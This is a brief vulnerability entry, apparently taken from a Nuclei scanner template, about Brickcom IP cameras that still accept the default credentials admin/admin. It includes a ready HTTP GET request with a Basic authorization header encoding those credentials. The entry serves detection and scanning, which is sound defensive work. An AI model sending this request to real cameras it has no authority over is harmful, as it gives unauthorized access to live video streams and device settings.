# Vulnerability: Brickcom Camera - Default Login
**Classification:** IOT
**Source:** Nuclei Template (`brickcom-camera-default-login.yaml`)

## Description
Detected Brickcom IP cameras accessible using default credentials (admin/admin). Successful authentication exposed full camera configuration, live video streams, LED control, and network settings to remote attackers.

## Vulnerable Code Pattern / Exploit Payload
```http
GET /index_mjpg.html HTTP/1.1
Host: {{Hostname}}
Authorization: Basic YWRtaW46YWRtaW4=
Connection: close
```

